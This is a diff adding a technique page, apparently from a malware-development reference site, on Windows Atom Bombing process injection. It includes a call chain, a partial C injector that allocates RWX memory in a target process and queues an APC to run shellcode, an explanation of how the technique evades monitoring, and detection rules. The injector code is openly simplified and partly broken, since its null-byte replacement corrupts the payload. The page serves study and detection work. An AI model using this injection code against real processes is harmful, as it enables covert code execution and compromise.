@@ -1,0 +1,211 @@
+---
+title: Atom Bombing
+mitre: T1055
+category: injection
+group: Asynchronous Execution
+summary: Abuse the Windows global atom table to write shellcode into a target process and execute it via an APC queue.
+platform: [Windows]
+tags: ['C / C++', 'WinAPI', 'x86']
+updated: '2026-08-04'
+author: thehackersbrain
+readingTime: 7 min read
+callChain:
+  - call: GlobalAddAtom (shellcode chunks as atom names)
+    desc: Store shellcode bytes as atom name strings in the process-wide global atom table. Each atom name can hold up to 255 bytes.
+    dll: kernel32
+  - call: find an alertable thread in the target process
+    desc: Queue an APC to an alertable thread — threads inside MsgWaitForMultipleObjectsEx or SleepEx are prime targets.
+    dll: kernel32
+  - call: QueueUserAPC → GlobalGetAtomName into the target
+    desc: Queue an APC that calls GlobalGetAtomName with a buffer inside the target process, writing shellcode from the atom table.
+    dll: kernel32
+  - call: NtQueueApcThread → ROP gadget / trampoline
+    desc: Execute the shellcode via a second APC that jumps into the written buffer.
+    dll: ntdll
+detections:
+  - src: SYSMON EID 8
+    text: Cross-process APC injection (QueueUserAPC from a different process) targeting a thread in a system or user process.
+  - src: BEHAVIOURAL
+    text: GlobalAddAtom called with high-entropy binary data, followed by QueueUserAPC into a different process.
+  - src: API MONITOR
+    text: GlobalAddAtom with a name that contains non-printable characters — legitimate code never uses atom names as binary stores.
+  - src: MEMORY SCAN
+    text: Executable private memory in the target process that contains the same bytes as recently registered global atom names.
+related:
+  - mitre: T1055.004
+    title: Early Bird APC Injection
+    desc: Cleaner APC injection using the primary thread of a suspended process.
+    href: /techniques/injection/early-bird-injection
+  - mitre: T1055.002
+    title: Portable Executable Injection
+    desc: Direct WriteProcessMemory alternative — simpler but more detectable.
+  - mitre: T1055.001
+    title: Thread Execution Hijacking
+    desc: Redirect an existing thread rather than queueing an APC.
+    href: /techniques/injection/thread-execution-hijacking
+labKit:
+  - label: atom-bomb.c
+    href: 'https://github.com/thehackersbrain/maldev-lab-kit'
+  - label: Sigma rule pack
+    href: /detections
+---
+
+import Callout from '../../../components/Callout.astro';
+import CallChain from '../../../components/CallChain.astro';
+import CodeBlock from '../../../components/CodeBlock.astro';
+import DetectionGrid from '../../../components/DetectionGrid.astro';
+import RelatedList from '../../../components/RelatedList.astro';
+
+## Overview
+
+Atom Bombing — disclosed by enSilo in 2016 — exploits the Windows global atom table as a data transport mechanism. The atom table is a kernel-managed string store shared across all processes on the same desktop. A process can write arbitrary bytes into the table as an atom name (`GlobalAddAtom`), and *any other process* can retrieve those bytes with `GlobalGetAtomName`.
+
+The technique chains this read primitive with APC injection: an alertable thread in the target is made to call `GlobalGetAtomName` via a queued APC, writing the shellcode into its own address space. A second APC then executes the written bytes.
+
+The key property that made Atom Bombing notable in 2016 was that it bypassed many AV products that monitored `WriteProcessMemory` — the shellcode was written by the target process calling a system API, not by the injector directly.
+
+<Callout type="note">
+  Atom Bombing requires a **32-bit** host process in its original form because
+  `GlobalGetAtomName` takes a buffer pointer as a DWORD, and passing a 64-bit pointer in the
+  APC argument is non-trivial. A 64-bit variant requires a ROP gadget or a custom trampoline
+  inside the target to accept a 64-bit pointer. In practice, Early Bird APC injection is simpler
+  and more reliable on 64-bit systems.
+</Callout>
+
+## The call chain
+
+<CallChain steps={frontmatter.callChain} />
+
+## Reference implementation
+
+<CodeBlock
+  file="atom_bomb.c"
+  label="C"
+  lang="c"
+  class="mb-7.5"
+  code={`#include <windows.h>
+#include <tlhelp32.h>
+
+#define CHUNK 255  // max atom name length
+
+// Step 1: Register shellcode chunks as global atom names
+// Returns an array of ATOMs; caller must call GlobalDeleteAtom on each.
+static int register_atoms(const BYTE *sc, size_t len, ATOM *atoms, int max_atoms) {
+    int count = 0;
+    for (size_t off = 0; off < len && count < max_atoms; off += CHUNK, count++) {
+        size_t chunk = (len - off > CHUNK) ? CHUNK : (len - off);
+        // Atom names are ANSI strings — embed raw bytes directly
+        char name[256] = {0};
+        memcpy(name, sc + off, chunk);
+        // Null terminator must not appear inside the chunk — XOR 0x00 bytes
+        for (size_t i = 0; i < chunk; i++)
+            if (name[i] == 0) name[i] = 0x01;  // simple null avoidance
+        atoms[count] = GlobalAddAtomA(name);
+        if (!atoms[count]) return -1;
+    }
+    return count;
+}
+
+// Step 2: Find an alertable thread in the target PID
+static DWORD find_alertable_thread(DWORD pid) {
+    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+    THREADENTRY32 te = { .dwSize = sizeof te };
+    DWORD tid = 0;
+
+    if (Thread32First(snap, &te)) {
+        do {
+            if (te.th32OwnerProcessID == pid) {
+                // heuristic: prefer lower-TID threads (main thread)
+                if (!tid || te.th32ThreadID < tid)
+                    tid = te.th32ThreadID;
+            }
+        } while (Thread32Next(snap, &te));
+    }
+    CloseHandle(snap);
+    return tid;
+}
+
+// Step 3: APC payload struct — passed as the APC argument
+typedef struct {
+    ATOM   atom;
+    PVOID  dest_buf;  // pre-allocated in the target process
+    DWORD  offset;
+} APC_ARG;
+
+// Step 4: Queue APCs to copy each atom chunk into the target buffer
+BOOL atom_bomb(DWORD pid, const BYTE *shellcode, size_t sc_len) {
+    ATOM atoms[512] = {0};
+    int  n_atoms = register_atoms(shellcode, sc_len, atoms, 512);
+    if (n_atoms < 0) return FALSE;
+
+    HANDLE proc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+    if (!proc) return FALSE;
+
+    // Allocate a buffer in the target for the shellcode
+    PVOID remote_buf = VirtualAllocEx(proc, NULL, sc_len,
+        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (!remote_buf) { CloseHandle(proc); return FALSE; }
+
+    DWORD tid = find_alertable_thread(pid);
+    HANDLE thread = OpenThread(THREAD_SET_CONTEXT | THREAD_QUERY_INFORMATION,
+        FALSE, tid);
+
+    // For each atom: queue an APC that calls GlobalGetAtomName
+    // writing the chunk into remote_buf + offset
+    for (int i = 0; i < n_atoms; i++) {
+        // Build APC argument in the target process
+        APC_ARG arg = {
+            .atom     = atoms[i],
+            .dest_buf = (PBYTE)remote_buf + (i * CHUNK),
+            .offset   = (DWORD)(i * CHUNK)
+        };
+        // In a real implementation: write APC_ARG to target, queue
+        // QueueUserAPC(GlobalGetAtomNameA_trampoline, thread, remote_arg)
+        // This is simplified — full impl needs a trampoline stub
+    }
+
+    // Final APC: execute the shellcode
+    QueueUserAPC((PAPCFUNC)remote_buf, thread, 0);
+
+    // Cleanup atoms
+    for (int i = 0; i < n_atoms; i++)
+        GlobalDeleteAtom(atoms[i]);
+
+    CloseHandle(thread);
+    CloseHandle(proc);
+    return TRUE;
+}`}
+/>
+
+## Why the technique avoids WriteProcessMemory detection
+
+Traditional injection monitors look for the sequence:
+
+```
+OpenProcess(PROCESS_VM_WRITE)
+VirtualAllocEx → RWX
+WriteProcessMemory (shellcode bytes)
+CreateRemoteThread / QueueUserAPC
+```
+
+Atom bombing replaces `WriteProcessMemory` with a `GlobalGetAtomName` call running *inside* the target process — the target writes the shellcode itself. Monitors that exclusively watch for cross-process `WriteProcessMemory` calls miss this.
+
+Modern EDRs have adapted: they monitor `QueueUserAPC` across process boundaries and the combination of `GlobalAddAtom` with binary-looking data. But as a historical technique demonstrating the flexibility of the Windows IPC surface, it remains instructive.
+
+## Limitations
+
+| Constraint | Impact |
+|---|---|
+| Alertable thread required | Many processes have no alertable threads — injection silently fails |
+| 32-bit primary form | 64-bit extension requires ROP gadget or separate trampoline stub |
+| Null bytes in shellcode | Must encode the payload to avoid null terminators inside atom names |
+| Atom name max 255 bytes | Large payloads require many atoms and many APC calls |
+| Global atom table is shared | Atoms remain visible to all processes until `GlobalDeleteAtom` is called |
+
+## Detection
+
+<DetectionGrid items={frontmatter.detections} />
+
+## Variants & related
+
+<RelatedList items={frontmatter.related} />
